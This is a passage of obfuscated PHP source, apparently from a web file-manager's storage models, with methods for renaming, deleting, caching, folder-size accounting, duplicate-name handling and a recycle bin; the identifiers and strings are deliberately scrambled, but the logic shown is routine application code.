$_SERVER[ˆûùúÊ¯]; $áßŒ²¨ú = $‰îşÊ„¾[$Ìæ¬êÒµ[190]]; if ($‰îşÊ„¾[$Ìæ¬êÒµ[461]] == $Ìæ¬êÒµ[98]) { $İËú©Œ’ = array($Ìæ¬êÒµ[628] => array($Ìæ¬êÒµ[588], $‰îşÊ„¾[$Ìæ¬êÒµ[561]] . $áßŒ²¨ú . $Ìæ¬êÒµ[589])); $ÈÂËúˆ = array($Ìæ¬êÒµ[628] => $İËú©Œ’[$Ìæ¬êÒµ[561]]); $”¸‚õ¶¦ = $this->field($Ìæ¬êÒµ[2197])->where($ÈÂËúˆ)->select(); $î¦ÅÕö‡ = !1; $ë–úæËé = array($áßŒ²¨ú); if ($”¸‚õ¶¦) { $î¦ÅÕö‡ = array_to_keyvalue($”¸‚õ¶¦, $Ìæ¬êÒµ[12], $Ìæ¬êÒµ[517]); $î¦ÅÕö‡ = array_remove_value($î¦ÅÕö‡, $Ìæ¬êÒµ[221]); $ë–úæËé = array_to_keyvalue($”¸‚õ¶¦, $Ìæ¬êÒµ[12], $Ìæ¬êÒµ[190]); $ë–úæËé[] = $áßŒ²¨ú; } } else { $î¦ÅÕö‡ = array($‰îşÊ„¾[$Ìæ¬êÒµ[517]]); $ë–úæËé = array($áßŒ²¨ú); } return array($Ìæ¬êÒµ[2194] => $ë–úæËé, $Ìæ¬êÒµ[1515] => $î¦ÅÕö‡); } public function removeArray($ÁêæÛÙû) { if (!$ÁêæÛÙû) { return !0; } } public function removeRelevance($Ü˜¥Ú¼, $Œ²—±óœ) { $Ğ¡¬¯©Î =& $_SERVER[ˆûùúÊ¯]; $Ü˜¥Ú¼ = $Ü˜¥Ú¼ ? $Ü˜¥Ú¼ : array(); $Œ²—±óœ = $Œ²—±óœ ? $Œ²—±óœ : array(); $Ü˜¥Ú¼ = array_unique(array_filter($Ü˜¥Ú¼)); $Œ²—±óœ = array_unique(array_filter($Œ²—±óœ)); if (!$Ü˜¥Ú¼) { return !1; } $ËÏœ¯·ğ = array($Ğ¡¬¯©Î[467] => array($Ğ¡¬¯©Î[468], $Ü˜¥Ú¼)); Model($Ğ¡¬¯©Î[2195])->where($ËÏœ¯·ğ)->delete(); Model($Ğ¡¬¯©Î[511])->where($ËÏœ¯·ğ)->delete(); Model($Ğ¡¬¯©Î[2043])->where($ËÏœ¯·ğ)->delete(); Model($Ğ¡¬¯©Î[609])->where($ËÏœ¯·ğ)->delete(); Model($Ğ¡¬¯©Î[1876])->removeBySource($Ü˜¥Ú¼); Model($Ğ¡¬¯©Î[2176])->removeBySource($Ü˜¥Ú¼); $this->where($ËÏœ¯·ğ)->delete(); Model($Ğ¡¬¯©Î[520])->remove($Œ²—±óœ); for ($°ñ­…ßã = 0; $°ñ­…ßã < count($Ü˜¥Ú¼); $°ñ­…ßã++) { $this->sourceCacheClear($Ü˜¥Ú¼[$°ñ­…ßã]); } } public function rename($ƒÏ™‰»ù, $ñÂüìñ¶) { $ñš£¹‹å =& $_SERVER[ˆûùúÊ¯]; $‚ğƒ£üé = $this->sourceInfo($ƒÏ™‰»ù); if (!$‚ğƒ£üé) { return !1; } $ÀÊ‹é‘Õ = $this->fileNameExist($‚ğƒ£üé[$ñš£¹‹å[189]], $ñÂüìñ¶); if ($ÀÊ‹é‘Õ && $ÀÊ‹é‘Õ != $ƒÏ™‰»ù) { return !1; } $ñ¯İÂÏü = array($ñš£¹‹å[470] => $ñÂüìñ¶, $ñš£¹‹å[627] => USER_ID); if ($‚ğƒ£üé[$ñš£¹‹å[461]] != $ñš£¹‹å[98]) { $ñ¯İÂÏü[$ñš£¹‹å[462]] = substr(get_path_ext($ñÂüìñ¶), 0, 10); } Model($ñš£¹‹å[609])->eventRename($ƒÏ™‰»ù, $‚ğƒ£üé[$ñš£¹‹å[42]], $ñÂüìñ¶); $this->sourceCacheClear($ƒÏ™‰»ù); $this->setNamePinyin($ƒÏ™‰»ù, $ñ¯İÂÏü[$ñš£¹‹å[42]], !1); $this->updateModifyTime($‚ğƒ£üé[$ñš£¹‹å[189]]); $ƒÖÑâª¿ = $this->where(array($ñš£¹‹å[467] => $ƒÏ™‰»ù))->data($ñ¯İÂÏü)->save(); $®Š«‰€ = $ñš£¹‹å[2184] . $‚ğƒ£üé[$ñš£¹‹å[189]]; if (isset(self::$cacheChildList[$®Š«‰€])) { unset(self::$cacheChildList[$®Š«‰€]); } return $ƒÖÑâª¿; } public function setNamePinyin($ĞƒÎ¦şû, $’€Øî„ö, $ÉÚÆä¥Ş = true) { $ùôÕ÷¹Ì =& $_SERVER[ˆûùúÊ¯]; $¤ğ±üâë = Input::check($’€Øî„ö, $ùôÕ÷¹Ì[631]); $²“ÎÔìÑ = array($ùôÕ÷¹Ì[493] => KodSort::makeStr($’€Øî„ö)); if ($¤ğ±üâë) { $²“ÎÔìÑ[$ùôÕ÷¹Ì[514]] = str_replace($ùôÕ÷¹Ì[63], $ùôÕ÷¹Ì[12], Pinyin::get($’€Øî„ö)); $²“ÎÔìÑ[$ùôÕ÷¹Ì[513]] = Pinyin::get($’€Øî„ö, $ùôÕ÷¹Ì[632]); } if (!$ÉÚÆä¥Ş && !$¤ğ±üâë) { $²“ÎÔìÑ[$ùôÕ÷¹Ì[514]] = null; $²“ÎÔìÑ[$ùôÕ÷¹Ì[513]] = null; } $this->metaSet($ĞƒÎ¦şû, $²“ÎÔìÑ); } public function getContent($˜˜ïçµ) { $Î‰™åÊ© =& $_SERVER[ˆûùúÊ¯]; $¾õ˜¿‰ = $this->fileInfoGet($˜˜ïçµ); if (!$¾õ˜¿‰) { return !1; } if ($¾õ˜¿‰[$Î‰™åÊ©[86]] == 0) { return $Î‰™åÊ©[12]; } $®¹úÀ¾ü = $Î‰™åÊ©[2198] . $¾õ˜¿‰[$Î‰™åÊ©[649]]; if ($¾õ˜¿‰[$Î‰™åÊ©[86]] <= 1024 * 10) { $ùÁšË = Cache::get($®¹úÀ¾ü); if (!$ùÁšË) { $ùÁšË = IO::getContent($¾õ˜¿‰[$Î‰™åÊ©[94]]); Cache::set($®¹úÀ¾ü, $ùÁšË); } return $ùÁšË; } if (!$¾õ˜¿‰[$Î‰™åÊ©[94]]) { return $Î‰™åÊ©[12]; } return IO::getContent($¾õ˜¿‰[$Î‰™åÊ©[94]]); } public function setDesc($¢µâÈ¶«, $ÕùüäÒ”) { $·ôÒª‹– =& $_SERVER[ˆûùúÊ¯]; Model($·ôÒª‹–[609])->eventAddDesc($¢µâÈ¶«, $ÕùüäÒ”); return $this->metaSet($¢µâÈ¶«, $·ôÒª‹–[502], $ÕùüäÒ”); } public function setContent($ñÛõÏº«, $¹ıĞ«Ôœ = '') { $®ã¤¢ßÉ =& $_SERVER[ˆûùúÊ¯]; $úÖµÀ¿š = $this->sourceInfo($ñÛõÏº«); $Á·ú“´‹ = $this->fileInfoGet($ñÛõÏº«); if (!$Á·ú“´‹ || !$úÖµÀ¿š) { return !1; } $›¥±ğÓñ = Model($®ã¤¢ßÉ[520])->addFileByContent($¹ıĞ«Ôœ, $úÖµÀ¿š[$®ã¤¢ßÉ[42]]); $›î Ã¾‡ = $this->fileHistory($úÖµÀ¿š, $›¥±ğÓñ[$®ã¤¢ßÉ[517]], $›¥±ğÓñ[$®ã¤¢ßÉ[86]]); if (!$›î Ã¾‡) { return Model($®ã¤¢ßÉ[520])->remove($›¥±ğÓñ[$®ã¤¢ßÉ[517]]); } $this->folderSizeReset($úÖµÀ¿š[$®ã¤¢ßÉ[189]]); return !0; } public function fileSubstr($¤°üœ, $†å¯‚Üƒ, $ÊìÕµèñ) { $ŞÒÔ€Ùş = $this->fileInfoGet($¤°üœ); if (!$ŞÒÔ€Ùş) { return !1; } return IO::fileSubstr($ŞÒÔ€Ùş[$_SERVER[ˆûùúÊ¯][94]], $†å¯‚Üƒ, $ÊìÕµèñ); } public function fileInfoGet($Ê‘‚÷şŒ) { $À•¹¯˜ =& $_SERVER[ˆûùúÊ¯]; $ÙÉşëƒÃ = $this->sourceInfo($Ê‘‚÷şŒ); if (!$ÙÉşëƒÃ || $ÙÉşëƒÃ[$À•¹¯˜[461]]) { return !1; } $™à’×á = $À•¹¯˜[523] . $ÙÉşëƒÃ[$À•¹¯˜[517]]; $Áµîƒœ = _get(self::$cacheFileInfo, $™à’×á); if ($Áµîƒœ) { return $Áµîƒœ; } $Ú÷Ñ’Û = Model($À•¹¯˜[520])->fileInfo($ÙÉşëƒÃ[$À•¹¯˜[517]]); if ($Ú÷Ñ’Û) { $Ú÷Ñ’Û[$À•¹¯˜[42]] = $ÙÉşëƒÃ[$À•¹¯˜[42]]; } self::$cacheFileInfo[$™à’×á] = $Ú÷Ñ’Û; return $Ú÷Ñ’Û; } private function folderChildrenNumber($ŸÕ»Òß›) { $¢ä¯òÊñ =& $_SERVER[ˆûùúÊ¯]; $»„Ò©… = $this->sourceInfo($ŸÕ»Òß›); $ºòÛ¥îü = array($¢ä¯òÊñ[628] => array($¢ä¯òÊñ[588], $»„Ò©…[$¢ä¯òÊñ[561]] . $ŸÕ»Òß› . $¢ä¯òÊñ[589]), $¢ä¯òÊñ[625] => $»„Ò©…[$¢ä¯òÊñ[546]], $¢ä¯òÊñ[480] => intval($»„Ò©…[$¢ä¯òÊñ[481]]), $¢ä¯òÊñ[622] => 1); $Ó­ºƒÄ = $this->where($ºòÛ¥îü)->count(); $È«ÂˆÖá = $this->where($ºòÛ¥îü)->where(array($¢ä¯òÊñ[622] => 0))->count(); return array($¢ä¯òÊñ[90] => $È«ÂˆÖá, $¢ä¯òÊñ[91] => $Ó­ºƒÄ); } public function pathInfo($–¸±ö…, $ÕÚ ÀÊĞ = false) { $Œ§ê¤îÜ =& $_SERVER[ˆûùúÊ¯]; $ÕÚ ÀÊĞ = !1; $–¸±ö… = intval($–¸±ö…); $»Â­ÃÒ = $Œ§ê¤îÜ[510] . intval($ÕÚ ÀÊĞ) . $Œ§ê¤îÜ[438] . $–¸±ö…; $òÜ±­ÇÎ = _get(self::$cachePathInfo, $»Â­ÃÒ); if ($òÜ±­ÇÎ) { return $òÜ±­ÇÎ; } $¦÷Äâö÷ = $this->sourceInfo($–¸±ö…); if (!$¦÷Äâö÷) { return !1; } $¦÷Äâö÷ = $this->_listDataApplyItem($¦÷Äâö÷, $ÕÚ ÀÊĞ); self::$cachePathInfo[$»Â­ÃÒ] = $¦÷Äâö÷; return $¦÷Äâö÷; } public static $cachePathInfoMore = array(); public function pathInfoMore($„ú’°ù) { $Å•‡À‰Ò =& $_SERVER[ˆûùúÊ¯]; $ÖÕø¬é˜ = _get(self::$cachePathInfoMore, $„ú’°ù); if ($ÖÕø¬é˜) { return $ÖÕø¬é˜; } $ğç”Ïíë = $this->pathInfo($„ú’°ù); if (!$ğç”Ïíë) { return !1; } if ($ğç”Ïíë[$Å•‡À‰Ò[461]] == $Å•‡À‰Ò[98]) { $ğç”Ïíë[$Å•‡À‰Ò[89]] = $this->folderChildrenNumber($„ú’°ù); } self::$cachePathInfoMore[$„ú’°ù] = $ğç”Ïíë; return $ğç”Ïíë; } public function sourceInfo($å›Õª¯) { $œ·ØÊ• =& $_SERVER[ˆûùúÊ¯]; if (!$å›Õª¯) { return array(); } $å›Õª¯ = intval($å›Õª¯); $õÈ½ÏºŒ = $œ·ØÊ•[509] . $å›Õª¯; $˜·Œ¬º¨ = _get(self::$cacheSourceInfo, $õÈ½ÏºŒ); if ($˜·Œ¬º¨) { return $˜·Œ¬º¨; } $§ú¾»ı = $this->where(array($œ·ØÊ•[190] => $å›Õª¯))->find(); self::$cacheSourceInfo[$õÈ½ÏºŒ] = $§ú¾»ı; return self::$cacheSourceInfo[$õÈ½ÏºŒ]; } public function sourceCacheClear($µæ¸Ñ = false) { self::cacheClear($µæ¸Ñ); } public static function cacheClear($¤Ğí»²á = false) { $ğÚ£¶â =& $_SERVER[ˆûùúÊ¯]; if ($¤Ğí»²á == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ğÚ£¶â[509] . $¤Ğí»²á]); unset(self::$cachePathInfoMore[$¤Ğí»²á]); unset(self::$cachePathInfo[$ğÚ£¶â[2199] . $¤Ğí»²á]); unset(self::$cachePathInfo[$ğÚ£¶â[2200] . $¤Ğí»²á]); } public function metaSet($Ì¬’ºé, $èûÔ¡šá = null, $î”›“ã = null) { $Èšş¡ğ  = parent::metaSet($Ì¬’ºé, $èûÔ¡šá, $î”›“ã); if ($Èšş¡ğ ) { $this->sourceCacheClear($Ì¬’ºé); } return $Èšş¡ğ ; } public function pathInfoByPath($Ğİ°ÒÒŠ, $Ñ­Öî—å) { $×ƒâì®è =& $_SERVER[ˆûùúÊ¯]; $Ş‘±À¾î = !$Ñ­Öî—å ? array() : explode($×ƒâì®è[8], trim($Ñ­Öî—å, $×ƒâì®è[8])); $”„˜¾–¾ = $Ğİ°ÒÒŠ; foreach ($Ş‘±À¾î as $…½´™Ùå) { $´ˆŒıİ = array($×ƒâì®è[189] => $”„˜¾–¾, $×ƒâì®è[42] => $…½´™Ùå); $–Ú¯àÕ = $this->field($×ƒâì®è[2201])->where($´ˆŒıİ)->select(); if (!$–Ú¯àÕ) { return !1; } $–Ú¯àÕ = array_sort_by($–Ú¯àÕ, $×ƒâì®è[481]); $”„˜¾–¾ = $–Ú¯àÕ[0][$×ƒâì®è[190]]; } $”à¸Ûğê = $this->sourceInfo($”„˜¾–¾); $this->pathInfoFilter($”à¸Ûğê); return $”à¸Ûğê; } protected function updateModifyTime($š÷°è²) { $Ø«¶Ç†å =& $_SERVER[ˆûùúÊ¯]; $¼Ë íÑÏ = defined($Ø«¶Ç†å[2117]) ? USER_ID : 0; if (!$š÷°è²) { return; } if (!is_array($š÷°è²)) { $š÷°è² = array($š÷°è²); } foreach ($š÷°è² as $óØüƒŒÎ => $ÙÁõœ†Á) { $š÷°è²[$óØüƒŒÎ] = intval($ÙÁõœ†Á); $this->sourceCacheClear($ÙÁõœ†Á); } $ìùÛùñë = array($Ø«¶Ç†å[190] => array($Ø«¶Ç†å[7], $š÷°è²)); $·ÌÈ’Á = array($Ø«¶Ç†å[627] => $¼Ë íÑÏ, $Ø«¶Ç†å[474] => time()); $this->where($ìùÛùñë)->save($·ÌÈ’Á); } public function folderSizeReset($“µ¯©ÀÆ, $‹ß‹…½ = false) { $¤±ŒÃËÃ =& $_SERVER[ˆûùúÊ¯]; if ($this->statusIgnoreResetSpace) { return; } $¢»“ùÌİ = $this->sourceInfo($“µ¯©ÀÆ); $ß®Êø—İ = $¤±ŒÃËÃ[2202] . $“µ¯©ÀÆ; CacheLock::lock($ß®Êø—İ, 20); if ($‹ß‹…½ === !1) { $this->sourceCacheClear($“µ¯©ÀÆ); $¢»“ùÌİ = $this->sourceInfo($“µ¯©ÀÆ); $¨ñª†ÒÌ = array($¤±ŒÃËÃ[453] => $“µ¯©ÀÆ, $¤±ŒÃËÃ[480] => 0); $”†­‰¯ï = $this->where($¨ñª†ÒÌ)->sum($¤±ŒÃËÃ[86]); $‹ß‹…½ = intval($”†­‰¯ï) - intval($¢»“ùÌİ[$¤±ŒÃËÃ[86]]); } if ($‹ß‹…½ == 0) { return CacheLock::unlock($ß®Êø—İ); } $ÈÇ§™Š¼ = $this->parentLevelArray($¢»“ùÌİ[$¤±ŒÃËÃ[561]]); if (!$ÈÇ§™Š¼) { $ÈÇ§™Š¼ = array(); } $ÈÇ§™Š¼[] = $¢»“ùÌİ[$¤±ŒÃËÃ[190]]; $¨ñª†ÒÌ = array($¤±ŒÃËÃ[190] => array($¤±ŒÃËÃ[468], $ÈÇ§™Š¼)); if ($‹ß‹…½ < 0) { $¨ñª†ÒÌ[$¤±ŒÃËÃ[86]] = array($¤±ŒÃËÃ[1076], abs($‹ß‹…½)); } $this->where($¨ñª†ÒÌ)->setAdd($¤±ŒÃËÃ[86], $‹ß‹…½); CacheLock::unlock($ß®Êø—İ); $Ë¦€„Á = $¤±ŒÃËÃ[2203] . $¢»“ùÌİ[$¤±ŒÃËÃ[187]] . $¤±ŒÃËÃ[4] . $¢»“ùÌİ[$¤±ŒÃËÃ[546]]; $ÜÛùô–ô = array($¢»“ùÌİ[$¤±ŒÃËÃ[187]], $¢»“ùÌİ[$¤±ŒÃËÃ[546]]); TaskRun::timeLimitCall($Ë¦€„Á, $¤±ŒÃËÃ[2204], $ÜÛùô–ô, 1.5); } public function folderSizeResetChildren($ÛÍ„˜ëÄ) { $‘şë¿”Ò =& $_SERVER[ˆûùúÊ¯]; $this->sourceCacheClear($ÛÍ„˜ëÄ); $İ àÉ¡Ó = $this->sourceInfo($ÛÍ„˜ëÄ); $ÊÒŞ†¾Ò = array($‘şë¿”Ò[622] => 1, $‘şë¿”Ò[625] => $İ àÉ¡Ó[$‘şë¿”Ò[546]], $‘şë¿”Ò[628] => array($‘şë¿”Ò[588], $İ àÉ¡Ó[$‘şë¿”Ò[561]] . $ÛÍ„˜ëÄ . $‘şë¿”Ò[589])); $•Ü¥ãëµ = $‘şë¿”Ò[2205]; $¹êì’Ò£ = $this->field($•Ü¥ãëµ)->where($ÊÒŞ†¾Ò)->select(); $ÊÒŞ†¾Ò[$‘şë¿”Ò[461]] = 0; $öÄßŸğ = $this->field($•Ü¥ãëµ)->where($ÊÒŞ†¾Ò)->select(); if (!$öÄßŸğ) { return; } $¹êì’Ò£[] = $İ àÉ¡Ó; $¹êì’Ò£ = array_to_keyvalue($¹êì’Ò£, $‘şë¿”Ò[190]); foreach ($¹êì’Ò£ as $¬îÑğ‡Ó => $å·œ˜öï) { $¹êì’Ò£[$¬îÑğ‡Ó][$‘şë¿”Ò[2206]] = $¹êì’Ò£[$¬îÑğ‡Ó][$‘şë¿”Ò[86]]; $¹êì’Ò£[$¬îÑğ‡Ó][$‘şë¿”Ò[86]] = 0; } foreach ($öÄßŸğ as $å·œ˜öï) { $ÑÈ£ØŞÁ = $å·œ˜öï[$‘şë¿”Ò[189]] . $‘şë¿”Ò[12]; if (!isset($¹êì’Ò£[$ÑÈ£ØŞÁ])) { continue; } if ($å·œ˜öï[$‘şë¿”Ò[481]] == $¹êì’Ò£[$ÑÈ£ØŞÁ][$‘şë¿”Ò[481]]) { $¹êì’Ò£[$ÑÈ£ØŞÁ][$‘şë¿”Ò[86]] += $å·œ˜öï[$‘şë¿”Ò[86]]; } } foreach ($¹êì’Ò£ as $å·œ˜öï) { $èÛÕñ­¬ = $this->parentLevelArray($å·œ˜öï[$‘şë¿”Ò[561]]); foreach ($èÛÕñ­¬ as $ÑÈ£ØŞÁ) { $ÑÈ£ØŞÁ = $ÑÈ£ØŞÁ . $‘şë¿”Ò[12]; if (!isset($¹êì’Ò£[$ÑÈ£ØŞÁ])) { continue; } if ($å·œ˜öï[$‘şë¿”Ò[481]] == $¹êì’Ò£[$ÑÈ£ØŞÁ][$‘şë¿”Ò[481]]) { $¹êì’Ò£[$ÑÈ£ØŞÁ][$‘şë¿”Ò[86]] += $å·œ˜öï[$‘şë¿”Ò[86]]; } } } $¶Ò¢‘úÕ = array(); foreach ($¹êì’Ò£ as $å·œ˜öï) { if ($å·œ˜öï[$‘şë¿”Ò[86]] == $å·œ˜öï[$‘şë¿”Ò[2206]]) { continue; } $¶Ò¢‘úÕ[] = array($‘şë¿”Ò[190], $å·œ˜öï[$‘şë¿”Ò[190]], $‘şë¿”Ò[86], $å·œ˜öï[$‘şë¿”Ò[86]]); } $this->saveAll($¶Ò¢‘úÕ); } public function userSpaceReset($å§¦Œµ¨ = false) { $Õå¼´ö =& $_SERVER[ˆûùúÊ¯]; $à©„¹¨Ó = $this->where(array($Õå¼´ö[187] => self::TYPE_USER, $Õå¼´ö[546] => $å§¦Œµ¨, $Õå¼´ö[461] => 0))->sum($Õå¼´ö[86]); $à©„¹¨Ó = !$à©„¹¨Ó || $à©„¹¨Ó <= 0 ? 0 : $à©„¹¨Ó; Model($Õå¼´ö[554])->userEdit($å§¦Œµ¨, array($Õå¼´ö[1885] => $à©„¹¨Ó)); } public function targetSpaceUpdate($Æ¡ÛÖã, $ØœË‡âº) { $ƒ¹Éó–¡ =& $_SERVER[ˆûùúÊ¯]; if (!$ØœË‡âº) { return; } if (!in_array($Æ¡ÛÖã, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $©º•¸§» = $this->targetSpaceSize($Æ¡ÛÖã, $ØœË‡âº); if ($Æ¡ÛÖã == self::TYPE_USER) { Model($ƒ¹Éó–¡[554])->userEdit($ØœË‡âº, array($ƒ¹Éó–¡[1885] => $©º•¸§»)); } else { if ($Æ¡ÛÖã == self::TYPE_GROUP) { Model($ƒ¹Éó–¡[562])->groupEdit($ØœË‡âº, array($ƒ¹Éó–¡[1885] => $©º•¸§»)); } } } public function targetSpaceSize($ì©Åº¬È, $¤íß´„û) { $½âÆÕØ¾ =& $_SERVER[ˆûùúÊ¯]; $ÁšŸşî­ = 0; $´õê‹Ğí = $this->targetSourceRoot($ì©Åº¬È, $¤íß´„û, !0); foreach ($´õê‹Ğí as $Ç€¿Åä¡) { if (!$Ç€¿Åä¡) { continue; } $ÁšŸşî­ += floatval($Ç€¿Åä¡[$½âÆÕØ¾[86]]); $ö›Û¨ØÈ = array($½âÆÕØ¾[628] => array($½âÆÕØ¾[588], $½âÆÕØ¾[571] . $Ç€¿Åä¡[$½âÆÕØ¾[190]] . $½âÆÕØ¾[589])); $‹Ã½µ­É = Model($½âÆÕØ¾[479])->field($½âÆÕØ¾[467])->where($ö›Û¨ØÈ)->select(); $‹Ã½µ­É = array_to_keyvalue($‹Ã½µ­É, $½âÆÕØ¾[12], $½âÆÕØ¾[190]); $‹Ã½µ­É = array_unique(array_filter($‹Ã½µ­É)); if ($‹Ã½µ­É) { $ö›Û¨ØÈ = array($½âÆÕØ¾[467] => array($½âÆÕØ¾[468], $‹Ã½µ­É)); $ÁšŸşî­ += floatval($this->where($ö›Û¨ØÈ)->sum($½âÆÕØ¾[86])); } } $ÁšŸşî­ = !$ÁšŸşî­ || $ÁšŸşî­ <= 0 ? 0 : $ÁšŸşî­; return $ÁšŸşî­; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÚºÓÀ±ª) { return $this->fileTypeProfile($ÚºÓÀ±ª, SourceModel::TYPE_USER); } public function groupFileTypeProfile($µõŸ±ªœ) { return $this->fileTypeProfile($µõŸ±ªœ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Šî‘‘‹€, $‰º¯¹ê») { $¨øä†½æ =& $_SERVER[ˆûùúÊ¯]; $—±ÛÈ¹Õ = $¨øä†½æ[2207] . $Šî‘‘‹€ . $¨øä†½æ[11] . $‰º¯¹ê»; $¼ŒŸø°õ = Cache::get($—±ÛÈ¹Õ); if ($¼ŒŸø°õ) { return $¼ŒŸø°õ; } $­ÚŸ¨ˆ = array($¨øä†½æ[622] => 0); if ($Šî‘‘‹€ != !1) { $­ÚŸ¨ˆ[$¨øä†½æ[546]] = $Šî‘‘‹€; $­ÚŸ¨ˆ[$¨øä†½æ[187]] = $‰º¯¹ê»; } $„ö³ü§ì = array(); $„ö³ü§ì[$¨øä†½æ[2208]] = array($¨øä†½æ[2209] => LNG($¨øä†½æ[2208]), $¨øä†½æ[2210] => $this->where($­ÚŸ¨ˆ)->count(), $¨øä†½æ[593] => $this->where($­ÚŸ¨ˆ)->sum($¨øä†½æ[86])); $™€üòÈÛ = KodIO::fileTypeList(); foreach ($™€üòÈÛ as $¨¹şÔôÄ => $–†µ‘Ù) { $­ÚŸ¨ˆ[$¨øä†½æ[462]] = $this->fileTypeWhere($¨¹şÔôÄ); $„ö³ü§ì[$¨¹şÔôÄ] = array($¨øä†½æ[2209] => $–†µ‘Ù[$¨øä†½æ[42]], $¨øä†½æ[2210] => $this->where($­ÚŸ¨ˆ)->count(), $¨øä†½æ[593] => $this->where($­ÚŸ¨ˆ)->sum($¨øä†½æ[86])); } Cache::set($—±ÛÈ¹Õ, $„ö³ü§ì, 1200); return $„ö³ü§ì; } public function fileNameExist($¿µ¶¨•, $Çı•åøƒ) { $¯÷¢ëö =& $_SERVER[ˆûùúÊ¯]; $Ğ¡üŞİĞ = $this->field($¯÷¢ëö[2211])->where(array($¯÷¢ëö[189] => $¿µ¶¨•, $¯÷¢ëö[42] => $Çı•åøƒ, $¯÷¢ëö[481] => 0))->find(); return is_array($Ğ¡üŞİĞ) ? $Ğ¡üŞİĞ[$¯÷¢ëö[190]] : !1; } public function childList($‹Áı´«…) { $´³í˜¶‘ =& $_SERVER[ˆûùúÊ¯]; $õš–¼Õ˜ = $´³í˜¶‘[2184] . $‹Áı´«…; if (isset(self::$cacheChildList[$õš–¼Õ˜])) { return self::$cacheChildList[$õš–¼Õ˜]; } $ş›şÛ° = array($´³í˜¶‘[189] => intval($‹Áı´«…), $´³í˜¶‘[481] => 0); $ôÀŸŞş = $this->where($ş›şÛ°)->select(); $ôÀŸŞş = $ôÀŸŞş ? $ôÀŸŞş : array(); self::$cacheChildList[$õš–¼Õ˜] = $ôÀŸŞş; foreach ($ôÀŸŞş as $©Èûîëö) { $õš–¼Õ˜ = $´³í˜¶‘[509] . $©Èûîëö[$´³í˜¶‘[190]]; self::$cacheSourceInfo[$õš–¼Õ˜] = $©Èûîëö; } return $ôÀŸŞş; } public function fileNameAuto($Ûš°“ã, $å°¶ßú½, $©˜ÅÖÜé = REPEAT_RENAME, $ïøˆµ™¦ = false) { $îüè’†¸ =& $_SERVER[ˆûùúÊ¯]; $ÛŸüËÊº = get_path_ext($å°¶ßú½); $ŠÆÀ€Úã = $ÛŸüËÊº ? basename($å°¶ßú½, $îüè’†¸[10] . $ÛŸüËÊº) . $îüè’†¸[2212] . $ÛŸüËÊº : $å°¶ßú½ . $îüè’†¸[436]; $Œ±„Öìà = array($îüè’†¸[189] => $Ûš°“ã, $îüè’†¸[481] => 0, $îüè’†¸[42] => array($îüè’†¸[435], $ŠÆÀ€Úã)); $ğéÌ¹ = $this->field($îüè’†¸[42])->where($Œ±„Öìà)->select(); $Ìû¥œß« = array_to_keyvalue($ğéÌ¹, $îüè’†¸[12], $îüè’†¸[42]); return $this->fileNameAutoGet($Ìû¥œß«, $å°¶ßú½, $©˜ÅÖÜé, $ïøˆµ™¦); } public function fileNameAutoGet($°§¶ìú, $â–Şû Ö, $Øæú±Øõ, $ÙÔ†§ÓÛ) { $³ˆ¿„¯Á =& $_SERVER[ˆûùúÊ¯]; if ($Øæú±Øõ == REPEAT_REPLACE || !$°§¶ìú || !in_array_not_case($â–Şû Ö, $°§¶ìú) || $ÙÔ†§ÓÛ && $Øæú±Øõ != REPEAT_RENAME_FOLDER) { return $â–Şû Ö; } if ($Øæú±Øõ == REPEAT_SKIP) { return !1; } $ÍàíÚíÙ = $³ˆ¿„¯Á[10] . get_path_ext($â–Şû Ö); $ÍàíÚíÙ = $ÍàíÚíÙ == $³ˆ¿„¯Á[10] || $ÙÔ†§ÓÛ ? $³ˆ¿„¯Á[12] : $ÍàíÚíÙ; for ($ğõæÙ = 1; $ğõæÙ <= count($°§¶ìú) + 1; $ğõæÙ++) { $¦Æû°Ğ = substr($â–Şû Ö, 0, strlen($â–Şû Ö) - strlen($ÍàíÚíÙ)); $«Õıî–ï = $¦Æû°Ğ . "\50{$ğõæÙ}\x29{$ÍàíÚíÙ}"; if (!in_array_not_case($«Õıî–ï, $°§¶ìú)) { return $«Õıî–ï; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\x63\145\x5f\162\x65\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\x63\164\151\157\x6e")); public function listData($Ê›Î˜Ë = false) { $ş“ûšÁ¯ =& $_SERVER[ˆûùúÊ¯]; $Ê›Î˜Ë = $Ê›Î˜Ë ? $Ê›Î˜Ë : USER_ID; $ØŞÇ„ŒÅ = $this->where(array($ş“ûšÁ¯[1695] => $Ê›Î˜Ë))->select(); return array_to_keyvalue($ØŞÇ„ŒÅ, $ş“ûšÁ¯[12], $ş“ûšÁ¯[190]); } public function moveToRecycle($™ ‘ÕÃË) { $§ã£óëõ =& $_SERVER[ˆûùúÊ¯]; $îÅ€¼® = Model($§ã£óëõ[1393]); $­®îÂ»„ = $îÅ€¼®->sourceInfo($™ ‘ÕÃË); if (!$­®îÂ»„ || $­®îÂ»„[$§ã£óëõ[481]] == $§ã£óëõ[98]) { return; } $¦ÒÂ ÈÀ = array($§ã£óëõ[467] => $™ ‘ÕÃË, $§ã£óëõ[1695] => USER_ID, $§ã£óëõ[624] => $­®îÂ»„[$§ã£óëõ[187]], $§ã£óëõ[625] => $­®îÂ»„[$§ã£óëõ[546]], $§ã£óëõ[628] => $­®îÂ»„[$§ã£óëõ[561]]); $this->add($¦ÒÂ ÈÀ); $this->recycleMove($™ ‘ÕÃË, 1); if ($­®îÂ»„[$§ã£óëõ[461]] == $§ã£óëõ[98]) { $™¯Çø«Ã = array($§ã£óëõ[628] => array($§ã£óëõ[588], $­®îÂ»„[$§ã£óëõ[561]] . $™ ‘ÕÃË . $§ã£óëõ[589])); $îÅ€¼®->where($™¯Çø«Ã)->setField($§ã£óëõ[481], 1); } } public function clear() { $this->remove(!1); } public function remove($áÓ¿½ìí = false, $“öå¦­— = false) { $ıßÊ¦İ =& $_SERVER[ˆûùúÊ¯]; $“öå¦­— = $“öå¦­— ? $“öå¦­— : USER_ID; $¡ÃœÜ¦Ê = Model($ıßÊ¦İ[1393]); $÷³’©ı“ = $this->listData($“öå¦­—); 